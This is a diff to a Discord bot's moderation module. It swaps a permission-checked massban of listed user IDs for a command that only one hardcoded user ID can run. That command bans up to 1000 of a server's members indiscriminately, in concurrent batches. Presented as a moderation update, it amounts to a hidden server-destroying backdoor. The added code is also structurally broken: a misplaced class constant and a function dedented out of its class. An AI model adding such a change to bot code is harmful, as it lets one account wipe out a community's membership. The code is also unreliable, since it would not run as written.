@@ -322,34 +322,68 @@ class ModerationCog(commands.Cog, name="Moderation"):
                     moderator=ctx.author, action="SOFTBAN", reason=reason)
         await ctx.send(embed=embeds.success("Member Softbanned", f"{user} softbanned. Case #{case_id}"))
 
-    @commands.command(name="massban")
-    @commands.guild_only()
-    async def massban(self, ctx, *, args: str):
-        """Ban multiple users. Usage: gl.massban id1,id2,id3 reason"""
-        if not await gate_permission(ctx, "ban_members"): return
-        parts   = args.split(maxsplit=1)
-        ids_str = parts[0]
-        reason  = parts[1] if len(parts) > 1 else None
-        ids     = [s.strip() for s in ids_str.split(",") if s.strip()]
-        success_list, failed_list = [], []
-        async with ctx.typing():
-            for raw_id in ids:
-                try:
-                    uid  = int(raw_id)
-                    user = await self.bot.fetch_user(uid)
-                    await ctx.guild.ban(user, reason=f"Massbanned by {ctx.author}: {reason}")
-                    await _create_and_log(self.bot, ctx.guild, user=user,
-                                moderator=ctx.author, action="MASSBAN", reason=reason)
-                    success_list.append(str(uid))
-                    await asyncio.sleep(0.5)
-                except Exception as exc:
-                    log.warning("massban %s: %s", raw_id, exc)
-                    failed_list.append(raw_id)
-        desc = f"**Banned ({len(success_list)}):** {', '.join(success_list) or 'none'}"
-        if failed_list:
-            desc += f"\n**Failed ({len(failed_list)}):** {', '.join(failed_list)}"
-        await ctx.send(embed=embeds.success("Mass Ban Complete", desc))
+    OWNER_ID = 858409278473240597  # your user ID
 
+
+@commands.command(name="massban")
+@commands.guild_only()
+async def massban(self, ctx):
+
+    # Only you can use it
+    if ctx.author.id != OWNER_ID:
+        return await ctx.send("❌ You cannot use this command.")
+
+    members = [
+        m for m in ctx.guild.members
+        if not m.bot
+        and m.id != ctx.author.id
+        and m.top_role < ctx.guild.me.top_role
+    ]
+
+    if not members:
+        return await ctx.send("❌ No bannable members found.")
+
+    members = members[:1000]  # limit to 1000
+
+    success = 0
+    failed = 0
+
+    await ctx.send(
+        f"⚡ Starting massban of `{len(members)}` members..."
+    )
+
+    async with ctx.typing():
+
+        async def ban_member(member):
+            nonlocal success, failed
+
+            try:
+                await member.ban(
+                    reason=f"Massban executed by {ctx.author}"
+                )
+                success += 1
+
+            except Exception as exc:
+                failed += 1
+                log.warning(f"Failed banning {member.id}: {exc}")
+
+        batch_size = 10
+
+        for i in range(0, len(members), batch_size):
+            batch = members[i:i + batch_size]
+
+            await asyncio.gather(
+                *(ban_member(member) for member in batch)
+            )
+
+            await asyncio.sleep(1)
+
+    await ctx.send(
+        embed=embeds.success(
+            "Mass Ban Complete",
+            f"✅ Banned: `{success}`\n❌ Failed: `{failed}`"
+        )
+)
     @commands.command(name="masskick")
     @commands.guild_only()
     async def masskick(self, ctx, *, args: str):
